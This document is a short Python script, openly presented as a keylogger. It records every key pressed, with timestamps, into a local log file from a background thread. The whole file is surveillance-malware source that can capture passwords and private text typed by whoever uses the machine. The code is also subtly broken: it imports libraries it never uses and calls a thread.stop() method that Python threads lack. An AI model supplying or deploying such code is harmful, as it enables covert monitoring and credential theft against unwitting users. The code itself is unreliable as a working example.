import keyboard
import time
import threading
import os
import base64
import json
import datetime

# Set the keylogger settings
keylogger_settings = {
    "interval": 0.1,  # interval between key presses
    "duration": 10,  # duration of the keylogger
    "log_file": "keylogger.log"  # log file
}

# Create a new thread to run the keylogger
def keylogger_thread():
    while True:
        # Get the current time
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Read the keyboard input
        keys = keyboard.read_key()

        # If the keys are not empty, log them
        if keys:
            # Convert the keys to a string
            key_string = "".join(keys)

            # Write the key string to the log file
            with open(keylogger_settings["log_file"], "a") as f:
                f.write(f"{current_time} - {key_string}\n")

        # Sleep for the specified interval
        time.sleep(keylogger_settings["interval"])

# Create a new thread to run the keylogger
thread = threading.Thread(target=keylogger_thread)
thread.start()

# Run the keylogger for the specified duration
time.sleep(keylogger_settings["duration"])

# Stop the keylogger
thread.stop()